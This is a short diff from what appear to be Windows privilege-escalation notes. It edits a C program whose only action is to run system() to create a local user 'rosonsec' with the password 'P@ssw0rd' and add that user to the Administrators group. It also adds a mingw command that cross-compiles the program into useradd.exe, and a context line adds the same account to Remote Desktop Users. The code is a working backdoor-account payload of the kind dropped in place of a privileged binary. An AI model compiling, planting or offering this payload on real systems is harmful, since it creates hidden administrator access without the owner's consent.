@@ -251,9 +251,13 @@ net localgroup "Remote Desktop Users" /add rosonsec
 int main ()
 {
   int i;
-  i=system ("net localgroup administrators rosonsec /add");
+  i=system ("net user rosonsec P@ssw0rd /add && net localgroup administrators rosonsec /add");
   return 0;
 }
+
+i686-w64-mingw32-gcc -o useradd.exe useradd.c
+
+
 
 
 
